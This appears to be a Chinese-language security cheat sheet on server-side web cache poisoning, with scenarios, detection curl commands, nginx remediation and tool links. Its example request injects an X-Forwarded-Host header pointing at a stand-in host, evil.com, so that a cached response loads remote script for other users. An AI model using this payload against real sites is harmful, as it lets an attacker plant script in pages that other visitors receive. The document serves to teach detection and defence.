# 服务端缓存污染 (Server-Side Cache Poisoning)

> **Tier 适用**: L1 ✅

## 一句话风险

通过注入恶意请求头污染缓存服务器，使其他用户获取恶意缓存内容。

## 一分钟识别清单

- [ ] 响应中反射了请求头内容且被缓存
- [ ] 存在未缓存的请求头（X-Forwarded-Host、X-Original-URL 等）
- [ ] 缓存键设计不当，包含恶意输入

## 一句话防御

正确配置缓存键，禁止缓存包含用户输入的响应头。

## 推荐工具链接

- [Web Cache Poisoner](https://github.com/s0md3v/Web-Cache-Poisner) - 缓存污染检测
- [Param Miner](https://github.com/PortSwigger/param-miner) - Burp 参数挖掘插件
- [PortSwigger Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)

## 常见攻击场景

| 场景 | 描述 |
|------|------|
| X-Forwarded-Host 污染 | 反射恶意 Host 导致 XSS |
| 重定向缓存 | 缓存恶意重定向 URL |
| Cookie 缓存 | 缓存包含恶意 Cookie 的响应 |
| URL 路径污染 | 通过 X-Original-URL 绕过 |

## 攻击示例

```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
...
<script src="http://evil.com/malicious.js"></script>
```

## 检测方法

```bash
# 检查缓存键
curl -H "X-Forwarded-Host: evil.com" https://target.com/page
curl https://target.com/page  # 再次请求查看是否被污染

# 检查缓存状态头
curl -I https://target.com/page
# X-Cache: HIT 表示命中缓存
```

## 修复配置

```nginx
# Nginx 禁用危险头的缓存
proxy_cache_methods GET HEAD;
proxy_cache_key "$scheme$request_method$host$request_uri";
proxy_ignore_headers X-Accel-Expires Expires Cache-Control;

# 不反射用户输入的头
proxy_hide_header X-Forwarded-Host;
```

## 参考

- [PortSwigger Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [Practical Web Cache Poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)
